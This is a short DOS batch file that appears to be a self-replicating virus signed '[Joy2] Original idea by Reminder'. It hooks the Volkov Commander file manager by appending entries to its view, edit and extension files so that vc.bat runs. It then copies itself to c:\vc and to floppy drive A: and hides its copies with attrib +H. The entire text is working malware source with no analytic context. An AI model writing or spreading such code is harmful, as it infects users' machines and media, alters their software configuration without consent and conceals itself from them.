@echo off
if not %1==A: goto e
if not exist c:\vc\vc.com goto e
if exist c:\vc\vc.bat goto n
echo  @vc.bat !: !.! V>>c:\vc\vcview.ext
echo  @vc.bat !: !.! E>>c:\vc\vcedit.ext
echo *: @vc.bat !: !.! R>>c:\vc\vc.ext
type vc.bat>c:\vc\vc.bat
if not exist c:\dos\attrib.* goto n
attrib +H c:\vc\vc.bat
:n
if exist %1\vcview.ext goto e
type c:\vc\vc.bat>%1\vc.bat
type c:\vc\vcview.ext>%1\vcview.ext      
type c:\vc\vcedit.ext>%1\vcedit.ext
type c:\vc\vc.ext>%1\vc.ext
if not exist c:\dos\attrib.* goto e
attrib +H %1\vc*.* 
:e
if not %3==R goto d
[Joy2] Original idea by Reminder
:d